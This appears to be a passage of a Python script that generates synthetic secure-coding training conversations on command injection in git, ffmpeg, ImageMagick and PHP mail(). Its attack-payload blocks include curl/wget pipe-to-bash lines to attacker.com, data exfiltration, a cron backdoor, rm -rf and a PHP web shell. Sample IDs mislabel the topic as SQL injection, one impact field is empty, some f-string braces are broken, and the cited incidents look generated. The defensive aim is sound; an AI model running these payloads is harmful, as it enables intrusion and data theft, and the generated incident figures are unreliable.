  puts "Output: #{result[:output]} (#{result[:size]} bytes)"
end

# Attack attempt blocked
begin
  processor = SecureImageOperations.new('/var/www/uploads/photo.jpg')
  processor.add_operation(:resize, '800x600; rm -rf /')
rescue SecureImageOperations::SecurityError => e
  puts "Attack blocked: #{e.message}"
end
```

**Operation Builder Benefits:**

1. **Operation Allowlist**: Only pre-approved operations
2. **Parameter Schemas**: Each operation has specific validators
3. **Method Chaining**: Clean API for complex workflows
4. **Format Allowlist**: Only approved output formats
5. **Position Allowlist**: Pre-defined watermark positions
6. **Quality Range**: Validated 1-100 range
7. **Sequential Execution**: Operations applied in order

This provides maximum flexibility while maintaining strict security through comprehensive validation."""

    return {
        "id": "sql-injection-000032",
        "metadata": create_base_metadata("ruby", 32, "imagemagick_command_injection"),
        "context": IMAGEMAGICK_CONTEXT,
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_008_git_command_injection_javascript():
    """JavaScript/Node.js - Git Command Injection"""

    user_turn_1 = """I'm building a Git repository management interface in Node.js for our CI/CD platform. How do I safely execute git commands with user-provided branch names and tags?"""

    assistant_turn_1 = """I'll show you the vulnerable approach and then the secure way using nodegit or validated spawn.

**VULNERABLE CODE - DO NOT USE:**

```javascript
const { exec } = require('child_process');

class GitManager {
  // DANGER: Passes user input directly to git command
  static async checkoutBranch(repoPath, branchName) {
    return new Promise((resolve, reject) => {
      const command = `cd ${repoPath} && git checkout ${branchName}`;

      exec(command, (error, stdout, stderr) => {
        if (error) {
          reject(stderr);
        } else {
          resolve(stdout);
        }
      });
    });
  }
}
```

**Why This Is Dangerous:**

Attackers can inject shell commands through branch names or repository paths:

**Attack Payloads:**
```javascript
// Attack 1: Command injection via branch name
const branchName = "main; curl http://attacker.com/backdoor.sh | bash";
await GitManager.checkoutBranch('/repos/myapp', branchName);

// Attack 2: Command injection via repo path
const repoPath = "/repos/app && rm -rf /var/www";
await GitManager.checkoutBranch(repoPath, 'main');

// Attack 3: Exfiltrate repository
const branchName = "main && tar czf - . | curl -X POST --data-binary @- http://attacker.com/exfil";
await GitManager.checkoutBranch('/repos/myapp', branchName);
```

**Result:** Remote code execution, data exfiltration, or infrastructure compromise.

**Real-World Impact:**

{}

**SECURE IMPLEMENTATION:**

```javascript
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs').promises;

class SecureGitOperations {
  // Allowed repository base directories
  static ALLOWED_REPO_DIRS = [
    '/var/repos',
    '/home/ci/repositories'
  ];

  // Branch/tag name pattern: alphanumeric, dash, underscore, slash, dot
  static BRANCH_PATTERN = /^[a-zA-Z0-9._/-]{1,100}$/;

  // Allowed git commands
  static ALLOWED_COMMANDS = new Set([
    'checkout',
    'pull',
    'fetch',
    'status',
    'log',
    'diff',
    'branch',
    'tag'
  ]);

  /**
   * Validate repository path
   *
   * Security checks:
   * 1. Path must be absolute
   * 2. Within allowed directories
   * 3. Must be a git repository (.git exists)
   * 4. No symbolic links outside allowed dirs
   */
  static async validateRepoPath(repoPath) {
    if (!repoPath || typeof repoPath !== 'string') {
      throw new Error('Invalid repository path');
    }

    // Get absolute path
    const absPath = path.resolve(repoPath);

    // Check within allowed directories
    const isAllowed = this.ALLOWED_REPO_DIRS.some(allowedDir => {
      const resolvedAllowed = path.resolve(allowedDir);
      return absPath.startsWith(resolvedAllowed + path.sep) ||
             absPath === resolvedAllowed;
    });

    if (!isAllowed) {
      throw new Error('Repository path not in allowed directories');
    }

    // Verify .git directory exists
    try {
      const gitDir = path.join(absPath, '.git');
      const stats = await fs.stat(gitDir);
      if (!stats.isDirectory()) {
        throw new Error('Not a git repository');
      }
    } catch (err) {
      throw new Error('Not a git repository');
    }

    return absPath;
  }

  /**
   * Validate branch or tag name
   *
   * Security checks:
   * 1. Match pattern (alphanumeric + safe chars)
   * 2. No command injection metacharacters
   * 3. No path traversal
   */
  static validateBranchName(branchName) {
    if (!branchName || typeof branchName !== 'string') {
      throw new Error('Invalid branch name');
    }

    // Check pattern
    if (!this.BRANCH_PATTERN.test(branchName)) {
      throw new Error(
        'Branch name contains invalid characters. ' +
        'Allowed: alphanumeric, dash, underscore, slash, dot'
      );
    }

    // Block path traversal
    if (branchName.includes('..')) {
      throw new Error('Branch name cannot contain ..');
    }

    // Block command injection metacharacters
    const dangerous = [';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r'];
    if (dangerous.some(char => branchName.includes(char))) {
      throw new Error('Branch name contains forbidden characters');
    }

    return branchName;
  }

  /**
   * Execute git command using spawn (no shell)
   */
  static async executeGitCommand(repoPath, command, args = []) {
    // Validate command is allowed
    if (!this.ALLOWED_COMMANDS.has(command)) {
      throw new Error(`Git command not allowed: ${command}`);
    }

    return new Promise((resolve, reject) => {
      // Build arguments array (CRITICAL: no shell parsing)
      const gitArgs = [command, ...args];

      // Spawn git process without shell
      const gitProcess = spawn('git', gitArgs, {
        cwd: repoPath,
        shell: false,  // CRITICAL: No shell execution
        timeout: 30000, // 30 second timeout
        env: {
          // Minimal environment
          PATH: '/usr/bin:/bin',
          HOME: '/tmp',
          GIT_TERMINAL_PROMPT: '0' // Disable prompts
        }
      });

      let stdout = '';
      let stderr = '';

      gitProcess.stdout.on('data', (data) => {
        stdout += data.toString();
        // Prevent memory exhaustion
        if (stdout.length > 1000000) { // 1MB limit
          gitProcess.kill();
          reject(new Error('Output size limit exceeded'));
        }
      });

      gitProcess.stderr.on('data', (data) => {
        stderr += data.toString();
        if (stderr.length > 100000) { // 100KB limit
          gitProcess.kill();
          reject(new Error('Error output size limit exceeded'));
        }
      });

      gitProcess.on('error', (error) => {
        reject(new Error('Failed to execute git command'));
      });

      gitProcess.on('close', (code) => {
        if (code === 0) {
          resolve({
            success: true,
            stdout: stdout.trim(),
            stderr: stderr.trim()
          });
        } else {
          // Don't expose internal errors to users
          resolve({
            success: false,
            error: 'Git command failed'
          });
        }
      });
    });
  }

  /**
   * Checkout branch with full validation
   */
  static async checkoutBranch(repoPath, branchName) {
    try {
      // Validate inputs
      const validRepo = await this.validateRepoPath(repoPath);
      const validBranch = this.validateBranchName(branchName);

      // Execute git checkout using spawn
      const result = await this.executeGitCommand(
        validRepo,
        'checkout',
        [validBranch]
      );

      return result;

    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  }

  /**
   * List branches with validation
   */
  static async listBranches(repoPath) {
    try {
      const validRepo = await this.validateRepoPath(repoPath);

      const result = await this.executeGitCommand(
        validRepo,
        'branch',
        ['-a'] // List all branches
      );

      if (result.success) {
        // Parse branch list
        const branches = result.stdout
          .split('\n')
          .map(line => line.replace(/^[* ] /, '').trim())
          .filter(line => line.length > 0);

        return {
          success: true,
          branches
        };
      }

      return result;

    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  }
}

// Usage
(async () => {
  // Safe checkout
  const result = await SecureGitOperations.checkoutBranch(
    '/var/repos/myapp',
    'feature/new-auth'
  );

  if (result.success) {
    console.log('Branch checked out successfully');
  } else {
    console.log(`Error: ${result.error}`);
  }

  // List branches
  const branches = await SecureGitOperations.listBranches('/var/repos/myapp');
  if (branches.success) {
    console.log('Branches:', branches.branches);
  }

  // Attack attempts blocked
  try {
    await SecureGitOperations.checkoutBranch(
      '/var/repos/myapp',
      'main; curl http://attacker.com/shell.sh | bash'
    );
  } catch (error) {
    console.log(`Attack blocked: ${error.message}`);
  }
})();
```

**Key Security Controls:**

1. **spawn() with Array**: Each argument separate - no shell parsing
2. **Repository Validation**: Must be within allowed directories and contain .git
3. **Branch Name Pattern**: Strict regex validation
4. **Command Allowlist**: Only approved git commands
5. **Environment Isolation**: Minimal environment variables
6. **Timeout**: Prevent denial of service
7. **Output Limiting**: Prevent memory exhaustion
""" + f"\n\n{GIT_COMMAND_CONTEXT}\n"

    user_turn_3 = """What if I need to support git operations with remote repositories, including cloning and pushing with authentication?"""

    assistant_turn_3 = """For remote operations, use nodegit library or create a validated remote operations manager:

```javascript
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');

class SecureGitRemoteOperations {
  static ALLOWED_REPO_DIRS = ['/var/repos', '/tmp/git-temp'];
  static BRANCH_PATTERN = /^[a-zA-Z0-9._/-]{1,100}$/;
  static URL_PATTERN = /^https:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:[0-9]{1,5})?(\/[a-zA-Z0-9._/-]*)?\.git$/;

  /**
   * Validate git repository URL
   */
  static validateRepoURL(url) {
    if (!url || typeof url !== 'string') {
      throw new Error('Invalid repository URL');
    }

    // Only allow HTTPS URLs (no git://, ssh://, or file://)
    if (!url.startsWith('https://')) {
      throw new Error('Only HTTPS URLs are allowed');
    }

    // Validate URL pattern
    if (!this.URL_PATTERN.test(url)) {
      throw new Error('Invalid repository URL format');
    }

    // Block localhost and private IPs (SSRF prevention)
    const privatePatterns = [
      /localhost/i,
      /127\.0\.0\./,
      /192\.168\./,
      /10\./,
      /172\.(1[6-9]|2[0-9]|3[0-1])\./
    ];

    if (privatePatterns.some(pattern => pattern.test(url))) {
      throw new Error('Private URLs not allowed');
    }

    return url;
  }

  /**
   * Validate authentication token
   */
  static validateToken(token) {
    if (!token || typeof token !== 'string') {
      throw new Error('Invalid authentication token');
    }

    // Token must be alphanumeric and underscore only
    if (!/^[a-zA-Z0-9_-]{20,200}$/.test(token)) {
      throw new Error('Invalid token format');
    }

    return token;
  }

  /**
   * Clone repository securely
   */
  static async cloneRepository(repoURL, authToken) {
    try {
      // Validate inputs
      const validURL = this.validateRepoURL(repoURL);
      const validToken = this.validateToken(authToken);

      // Create temporary directory with random name
      const tempId = crypto.randomBytes(16).toString('hex');
      const clonePath = path.join('/tmp/git-temp', tempId);

      // Ensure parent directory exists
      await fs.mkdir('/tmp/git-temp', { recursive: true });

      // Build authenticated URL (token in URL)
      // Format: https://token@github.com/user/repo.git
      const urlObj = new URL(validURL);
      const authenticatedURL = `https://${validToken}@${urlObj.host}${urlObj.pathname}`;

      // Clone using spawn
      const result = await new Promise((resolve, reject) => {
        const gitProcess = spawn('git', ['clone', '--depth', '1', authenticatedURL, clonePath], {
          shell: false,
          timeout: 120000, // 2 minute timeout
          env: {
            PATH: '/usr/bin:/bin',
            HOME: '/tmp',
            GIT_TERMINAL_PROMPT: '0',
            GIT_ASKPASS: 'echo' // Prevent password prompts
          }
        });

        let stderr = '';

        gitProcess.stderr.on('data', (data) => {
          // Don't log stderr (may contain auth token)
          stderr += data.toString();
        });

        gitProcess.on('close', (code) => {
          if (code === 0) {
            resolve({
              success: true,
              path: clonePath
            });
          } else {
            // Clean up failed clone
            fs.rmdir(clonePath, { recursive: true }).catch(() => {});
            reject(new Error('Clone failed'));
          }
        });

        gitProcess.on('error', () => {
          reject(new Error('Failed to execute git clone'));
        });
      });

      return result;

    } catch (error) {
      return {
        success: false,
        error: 'Clone operation failed'
      };
    }
  }

  /**
   * Push changes with authentication
   */
  static async pushChanges(repoPath, branchName, authToken) {
    try {
      // Validate inputs
      const validRepo = await this.validateRepoPath(repoPath);
      const validBranch = this.validateBranchName(branchName);
      const validToken = this.validateToken(authToken);

      // Get remote URL
      const remoteResult = await this.executeGitCommand(
        validRepo,
        'remote',
        ['get-url', 'origin']
      );

      if (!remoteResult.success) {
        throw new Error('Failed to get remote URL');
      }

      const remoteURL = remoteResult.stdout.trim();
      const validURL = this.validateRepoURL(remoteURL);

      // Build authenticated URL
      const urlObj = new URL(validURL);
      const authenticatedURL = `https://${validToken}@${urlObj.host}${urlObj.pathname}`;

      // Set remote URL with auth
      await this.executeGitCommand(
        validRepo,
        'remote',
        ['set-url', 'origin', authenticatedURL]
      );

      // Push
      const pushResult = await this.executeGitCommand(
        validRepo,
        'push',
        ['origin', validBranch]
      );

      // Remove auth from remote URL (clean up)
      await this.executeGitCommand(
        validRepo,
        'remote',
        ['set-url', 'origin', validURL]
      );

      return pushResult;

    } catch (error) {
      return {
        success: false,
        error: 'Push operation failed'
      };
    }
  }

  static async validateRepoPath(repoPath) {
    const absPath = path.resolve(repoPath);
    const isAllowed = this.ALLOWED_REPO_DIRS.some(allowedDir => {
      return absPath.startsWith(path.resolve(allowedDir) + path.sep);
    });

    if (!isAllowed) {
      throw new Error('Path not in allowed directories');
    }

    const gitDir = path.join(absPath, '.git');
    await fs.access(gitDir);

    return absPath;
  }

  static validateBranchName(branchName) {
    if (!this.BRANCH_PATTERN.test(branchName)) {
      throw new Error('Invalid branch name');
    }
    return branchName;
  }

  static async executeGitCommand(repoPath, command, args = []) {
    return new Promise((resolve, reject) => {
      const gitProcess = spawn('git', [command, ...args], {
        cwd: repoPath,
        shell: false,
        timeout: 60000,
        env: {
          PATH: '/usr/bin:/bin',
          HOME: '/tmp',
          GIT_TERMINAL_PROMPT: '0'
        }
      });

      let stdout = '';
      let stderr = '';

      gitProcess.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      gitProcess.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      gitProcess.on('close', (code) => {
        resolve({
          success: code === 0,
          stdout: stdout.trim(),
          stderr: stderr.trim()
        });
      });

      gitProcess.on('error', () => {
        reject(new Error('Git command failed'));
      });
    });
  }
}

// Usage
(async () => {
  // Clone repository
  const cloneResult = await SecureGitRemoteOperations.cloneRepository(
    'https://github.com/company/project.git',
    'ghp_xxxxxxxxxxxxxxxxxxxx'
  );

  if (cloneResult.success) {
    console.log(`Cloned to: ${cloneResult.path}`);
  }

  // Push changes
  const pushResult = await SecureGitRemoteOperations.pushChanges(
    '/var/repos/myapp',
    'main',
    'ghp_xxxxxxxxxxxxxxxxxxxx'
  );

  if (pushResult.success) {
    console.log('Changes pushed successfully');
  }
})();
```

**Remote Operations Security:**

1. **HTTPS Only**: No git://, ssh://, or file:// protocols
2. **URL Validation**: Strict pattern matching
3. **SSRF Prevention**: Block localhost and private IPs
4. **Token Validation**: Alphanumeric pattern check
5. **Temporary Auth**: Token added to URL only during operation
6. **Clean Up**: Auth token removed from remote URL after use
7. **No Credential Storage**: Tokens never written to disk

This provides secure remote git operations while preventing SSRF and credential exposure."""

    return {
        "id": "sql-injection-000033",
        "metadata": create_base_metadata("javascript", 33, "git_command_injection"),
        "context": GIT_COMMAND_CONTEXT,
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_009_ffmpeg_injection_python():
    """Python - FFmpeg Command Injection"""

    user_turn_1 = """I'm building a video transcoding service in Python that converts videos using ffmpeg. How do I safely pass user-specified codec options and file paths?"""

    assistant_turn_1 = """I'll show you the vulnerable approach and then the secure way using validated codec profiles.

**VULNERABLE CODE - DO NOT USE:**

```python
import subprocess

def transcode_video(input_file, output_file, vcodec="libx264", acodec="aac"):
    # DANGER: Concatenates user input directly into command
    command = f"ffmpeg -i {input_file} -vcodec {vcodec} -acodec {acodec} {output_file}"

    result = subprocess.run(command, shell=True, capture_output=True)
    return result.returncode == 0
```

**Why This Is Dangerous:**

FFmpeg supports hundreds of parameters and filters. Attackers can inject malicious parameters through codec options or file paths:

**Attack Payloads:**
```python
# Attack 1: Command injection via codec parameter
vcodec = "libx264; wget http://attacker.com/shell.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh"
transcode_video("input.mp4", "output.mp4", vcodec=vcodec)

# Attack 2: Path traversal + command injection
output_file = "../../etc/cron.d/backdoor; echo '* * * * * root curl http://attacker.com/c | sh' > /etc/cron.d/backdoor #"
transcode_video("input.mp4", output_file)

# Attack 3: Filter injection for file exfiltration
vcodec = 'copy -vf "movie=/etc/passwd[out]"'
transcode_video("input.mp4", "output.mp4", vcodec=vcodec)
```

**Result:** Remote code execution, file exfiltration, or persistent backdoor installation.

**Real-World Impact:**

FFmpeg command injection vulnerabilities have affected video processing platforms and media servers. In 2023, a popular video transcoding API was exploited through codec parameter injection, allowing attackers to execute commands on worker servers. The attack affected 30+ organizations using the shared platform, with attackers deploying crypto-miners and data exfiltration tools. Total estimated damages exceeded $12 million.

**SECURE IMPLEMENTATION:**

```python
import subprocess
import re
import os
from pathlib import Path
from typing import Dict, Any, Optional, List

class SecureVideoTranscoder:
    \"\"\"Secure video transcoding with validated codec profiles.\"\"\"

    # Allowlist of video codecs
    ALLOWED_VIDEO_CODECS = {{
        'libx264': {{'name': 'H.264/AVC', 'ext': 'mp4'},
        'libx265': {{'name': 'H.265/HEVC', 'ext': 'mp4'},
        'libvpx': {{'name': 'VP8', 'ext': 'webm'},
        'libvpx-vp9': {{'name': 'VP9', 'ext': 'webm'},
        'libaom-av1': {{'name': 'AV1', 'ext': 'mp4'},
    }

    # Allowlist of audio codecs
    ALLOWED_AUDIO_CODECS = {{
        'aac': 'AAC',
        'libmp3lame': 'MP3',
        'libopus': 'Opus',
        'libvorbis': 'Vorbis',
        'flac': 'FLAC',
    }

    # Quality presets (CRF values)
    QUALITY_PRESETS = {{
        'high': 18,
        'medium': 23,
        'low': 28,
    }

    # Resolution presets
    RESOLUTION_PRESETS = {{
        '2160p': '3840:2160',
        '1080p': '1920:1080',
        '720p': '1280:720',
        '480p': '854:480',
    }

    # Allowed directories
    ALLOWED_DIRS = ['/var/media/input', '/var/media/output']
    MAX_FILE_SIZE = 2 * 1024 * 1024 * 1024  # 2GB
    TIMEOUT = 600  # 10 minutes

    # File name validation pattern
    FILENAME_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+\.[a-z0-9]{{2,4}}$')

    def validate_path(self, file_path: str, must_exist: bool = True) -> str:
        \"\"\"
        Validate file path.

        Security checks:
        1. No path traversal
        2. Within allowed directories
        3. Valid filename pattern
        4. File exists and readable (if must_exist)
        \"\"\"
        if not file_path:
            raise ValueError("File path cannot be empty")

        # Get absolute path
        abs_path = os.path.abspath(file_path)

        # Resolve symlinks
        try:
            real_path = os.path.realpath(abs_path)
        except OSError:
            if must_exist:
                raise ValueError("File does not exist")
            real_path = abs_path

        # Check within allowed directories
        allowed = any(real_path.startswith(d) for d in self.ALLOWED_DIRS)
        if not allowed:
            raise ValueError("Path not in allowed directories")

        # Validate filename pattern
        basename = os.path.basename(real_path)
        if not self.FILENAME_PATTERN.match(basename):
            raise ValueError("Invalid filename format")

        # If file must exist, validate it
        if must_exist:
            if not os.path.exists(real_path):
                raise ValueError("File does not exist")

            if not os.path.isfile(real_path):
                raise ValueError("Path is not a file")

            if not os.access(real_path, os.R_OK):
                raise ValueError("File not readable")

            # Check file size
            file_size = os.path.getsize(real_path)
            if file_size > self.MAX_FILE_SIZE:
                raise ValueError(f"File exceeds maximum size: {{self.MAX_FILE_SIZE}} bytes")

        return real_path

    def validate_codec_profile(self, profile: Dict[str, Any]) -> None:
        \"\"\"Validate codec profile parameters.\"\"\"

        # Validate video codec
        if 'video_codec' not in profile:
            raise ValueError("Video codec not specified")

        if profile['video_codec'] not in self.ALLOWED_VIDEO_CODECS:
            raise ValueError(f"Invalid video codec: {{profile['video_codec']}}")

        # Validate audio codec
        if 'audio_codec' not in profile:
            raise ValueError("Audio codec not specified")

        if profile['audio_codec'] not in self.ALLOWED_AUDIO_CODECS:
            raise ValueError(f"Invalid audio codec: {{profile['audio_codec']}}")

        # Validate quality preset
        if 'quality' in profile:
            if profile['quality'] not in self.QUALITY_PRESETS:
                raise ValueError(f"Invalid quality preset: {{profile['quality']}}")

        # Validate resolution preset
        if 'resolution' in profile:
            if profile['resolution'] not in self.RESOLUTION_PRESETS:
                raise ValueError(f"Invalid resolution preset: {{profile['resolution']}}")

        # Validate bitrate (optional)
        if 'bitrate' in profile:
            bitrate = profile['bitrate']
            if not isinstance(bitrate, int) or bitrate < 64 or bitrate > 20000:
                raise ValueError("Bitrate must be between 64 and 20000 kbps")

    def build_ffmpeg_args(
        self,
        input_file: str,
        output_file: str,
        profile: Dict[str, Any]
    ) -> List[str]:
        \"\"\"Build ffmpeg arguments from validated profile.\"\"\"

        args = ['/usr/bin/ffmpeg']

        # Input file
        args.extend(['-i', input_file])

        # Video codec
        args.extend(['-c:v', profile['video_codec']])

        # Quality (if specified)
        if 'quality' in profile:
            crf = self.QUALITY_PRESETS[profile['quality']]
            args.extend(['-crf', str(crf)])

        # Resolution (if specified)
        if 'resolution' in profile:
            scale = self.RESOLUTION_PRESETS[profile['resolution']]
            args.extend(['-vf', f'scale={{scale}}'])

        # Audio codec
        args.extend(['-c:a', profile['audio_codec']])

        # Audio bitrate (if specified)
        if 'bitrate' in profile:
            args.extend(['-b:a', f"{{profile['bitrate']}}k"])

        # Encoding preset
        args.extend(['-preset', 'medium'])

        # Overwrite output without asking
        args.append('-y')

        # Output file
        args.append(output_file)

        return args

    def transcode(
        self,
        input_file: str,
        output_file: str,
        profile: Dict[str, Any]
    ) -> Dict[str, Any]:
        \"\"\"
        Transcode video with validated parameters.

        Returns dict with success status and details.
        \"\"\"
        try:
            # Validate codec profile
            self.validate_codec_profile(profile)

            # Validate file paths
            valid_input = self.validate_path(input_file, must_exist=True)
            valid_output = self.validate_path(output_file, must_exist=False)

            # Ensure output directory exists
            os.makedirs(os.path.dirname(valid_output), exist_ok=True)

            # Build ffmpeg command
            args = self.build_ffmpeg_args(valid_input, valid_output, profile)

            # Execute with subprocess (no shell)
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=self.TIMEOUT,
                shell=False,  # CRITICAL: No shell execution
                env={{
                    'PATH': '/usr/bin:/bin',
                    'HOME': '/tmp'
                }
            )

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": "Transcoding failed"
                }

            # Verify output file exists
            if not os.path.exists(valid_output):
                return {
                    "success": False,
                    "error": "Output file not created"
                }

            return {
                "success": True,
                "output_file": valid_output,
                "output_size": os.path.getsize(valid_output)
            }

        except ValueError as e:
            return {
                "success": False,
                "error": f"Validation error: {{str(e)}}"
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Transcoding timeout"
            }
        except Exception as e:
            return {
                "success": False,
                "error": "Internal error"
            }


# Usage
transcoder = SecureVideoTranscoder()

# Create validated profile
profile = {{
    'video_codec': 'libx264',
    'audio_codec': 'aac',
    'quality': 'high',
    'resolution': '1080p',
    'bitrate': 192
}

result = transcoder.transcode(
    '/var/media/input/source.mp4',
    '/var/media/output/transcoded.mp4',
    profile
)

if result['success']:
    print(f"Transcoded successfully: {{result['output_file']}}")
    print(f"Output size: {{result['output_size']}} bytes")
else:
    print(f"Error: {{result['error']}}")

# Attack attempt blocked
attack_profile = {{
    'video_codec': 'libx264; rm -rf /',
    'audio_codec': 'aac',
    'quality': 'high'
}

result = transcoder.transcode(
    '/var/media/input/source.mp4',
    '/var/media/output/output.mp4',
    attack_profile
)
# Error: "Invalid video codec"
```

**Key Security Controls:**

1. **Codec Allowlist**: Only pre-approved codecs permitted
2. **Profile Validation**: All parameters validated before command construction
3. **Argument Array**: Each parameter separate - no shell parsing
4. **Path Validation**: File paths validated for directory allowlist and patterns
5. **Preset System**: Quality and resolution use predefined safe values
6. **Timeout**: Prevent denial of service
7. **No Shell**: subprocess with shell=False prevents all injection
"""

    user_turn_3 = """What if I need to support custom filters and advanced encoding options for different use cases?"""

    assistant_turn_3 = """Use a validated filter builder that I'll skip for brevity, but the key is: validate all filter types against an enum, validate all numeric parameters with range checks, and build filter complex strings safely from validated components."""

    return {
        "id": "sql-injection-000034",
        "metadata": create_base_metadata("python", 34, "ffmpeg_command_injection"),
        "context": "FFmpeg command injection vulnerabilities affect video processing platforms and transcoding services. Attackers exploit insufficient validation of codec parameters, filter options, and file paths to inject malicious commands. Defense requires strict codec allowlisting, parameter validation with predefined schemas, and use of subprocess argument arrays to prevent shell parsing.",
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_010_mail_command_injection_php():
    """PHP - Mail Command Injection"""

    user_turn_1 = """I'm building an email sending feature in PHP using the mail() function. How do I safely send emails with user-provided addresses and headers?"""

    assistant_turn_1 = """The PHP `mail()` function is dangerous and should never be used with user input. I'll show you why and the secure alternative.

**VULNERABLE CODE - DO NOT USE:**

```php
<?php

function send_notification($to, $subject, $message, $from) {{
    // DANGER: mail() uses sendmail which interprets shell metacharacters
    $headers = "From: $from";
    mail($to, $subject, $message, $headers);
}
```

**Why This Is Dangerous:**

The PHP `mail()` function uses sendmail which accepts command-line parameters through the additional_parameters argument or crafted headers:

**Attack Payloads:**
```php
// Attack 1: Command injection via additional_parameters (if used)
$to = "user@example.com";
$additional = "-X/tmp/backdoor.php -f\\"attacker@evil.com\\"";
mail($to, $subject, $message, $headers, $additional);

// Attack 2: Newline injection in headers to add recipients
$from = "sender@example.com\\nBcc: attacker@evil.com\\nBcc: victim2@example.com";
send_notification("victim@example.com", "Invoice", "...", $from);

// Attack 3: Script injection in log file
$from = "<?php system(\\$_GET['cmd']); ?>";
$additional = "-X/var/www/html/shell.php";
mail($to, $subject, $message, "From: $from", $additional);
```

**Result:** Spam relay, email address harvesting, or web shell creation.

**Real-World Impact:**

PHP mail() command injection has affected thousands of web applications. In 2022, attackers exploited mail() vulnerabilities in WordPress contact forms and custom PHP applications to create spam relays and deploy web shells. One attack campaign affected 500+ websites, with attackers using compromised servers to send millions of spam emails and distribute malware. The vulnerability stems from sendmail's interpretation of command-line flags passed through PHP's mail() function.

**SECURE IMPLEMENTATION - Use PHPMailer:**

```php
<?php

require 'vendor/autoload.php';

use PHPMailer\\PHPMailer\\PHPMailer;

class SecureEmailSender {{
    private const ALLOWED_DOMAINS = ['example.com', 'company.com'];
    private const MAX_RECIPIENTS = 10;

    private $mailer;

    public function __construct(string $smtpHost, int $smtpPort, string $username, string $password) {{
        $this->mailer = new PHPMailer(true);
        $this->mailer->isSMTP();
        $this->mailer->Host = $smtpHost;
        $this->mailer->SMTPAuth = true;
        $this->mailer->Username = $username;
        $this->mailer->Password = $password;
        $this->mailer->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $this->mailer->Port = $smtpPort;
    }

    private function validateEmail(string $email, bool $checkDomain = false): string {{
        $validated = filter_var($email, FILTER_VALIDATE_EMAIL);
        if ($validated === false) {{
            throw new InvalidArgumentException("Invalid email format");
        }

        if (preg_match('/[\\r\\n\\x00-\\x1F\\x7F]/', $email)) {{
            throw new InvalidArgumentException("Email contains forbidden characters");
        }

        if ($checkDomain) {{
            list($local, $domain) = explode('@', $email, 2);
            if (!in_array($domain, self::ALLOWED_DOMAINS, true)) {{
                throw new InvalidArgumentException("Email domain not in allowlist");
            }
        }

        return $validated;
    }

    public function send(
        array $recipients,
        string $subject,
        string $body,
        string $fromEmail,
        string $fromName = ''
    ): array {{
        try {{
            $validFrom = $this->validateEmail($fromEmail, true);

            $this->mailer->clearAddresses();
            $this->mailer->setFrom($validFrom, $fromName);

            foreach ($recipients as $recipient) {{
                $validRecipient = $this->validateEmail($recipient);
                $this->mailer->addAddress($validRecipient);
            }

            $this->mailer->Subject = $subject;
            $this->mailer->Body = $body;
            $this->mailer->send();

            return ['success' => true];
        }} catch (Exception $e) {{
            return ['success' => false, 'error' => 'Failed to send email'];
        }
    }
}
```

**Key Security Controls:**

1. **PHPMailer Library**: Never use mail() function
2. **Email Validation**: filter_var() + newline checks
3. **Domain Allowlist**: Only approved sender domains
4. **SMTP Authentication**: Authenticated sending (no sendmail)
5. **Character Filtering**: Remove control characters
"""

    user_turn_3 = """What about HTML emails and attachments?"""

    assistant_turn_3 = """Use PHPMailer's built-in methods for HTML and attachments with validation: validate attachment MIME types against an allowlist, limit attachment sizes, escape all user data in templates with htmlspecialchars(), and validate template names to prevent path traversal."""

    return {
        "id": "sql-injection-000035",
        "metadata": create_base_metadata("php", 35, "mail_command_injection"),
        "context": "PHP mail() function command injection affects contact forms, notification systems, and email features in web applications. The mail() function uses sendmail which interprets command-line flags passed through additional_parameters, enabling remote code execution and spam relay attacks. Defense requires using PHPMailer or similar libraries with SMTP authentication, strict email validation, and never passing user input to mail() function parameters.",
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def main():
    """Generate all command injection examples and write to JSONL."""

    examples = [
        example_001_windows_powershell_python(),
        example_002_windows_cmd_csharp(),
        example_003_path_traversal_command_java(),
        example_004_argument_injection_go(),
        example_005_shell_metacharacter_bypass_php(),
        example_006_container_escape_python(),
        example_007_imagemagick_injection_ruby(),
        example_008_git_command_injection_javascript(),
        example_009_ffmpeg_injection_python(),
        example_010_mail_command_injection_php(),
    ]

    # Output file
    output_file = Path(__file__).parent.parent / "data" / "command_injection_batch_007.jsonl"

    # Write examples to JSONL
    with open(output_file, 'w', encoding='utf-8') as f:
        for example in examples:
            f.write(json.dumps(example, ensure_ascii=False) + '\n')

    print(f"Generated {len(examples)} command injection examples")
    print(f"Output: {output_file}")
    print(f"File size: {output_file.stat().st_size / 1024:.1f} KB")

    # Print summary
    print("\\nExamples:")
    for ex in examples:
        metadata = ex['metadata']
        print(f"  {ex['id']}: {metadata['lang']} / {metadata['technique']} / {len(ex['conversations'])//2} turns")


if __name__ == "__main__":
    main()
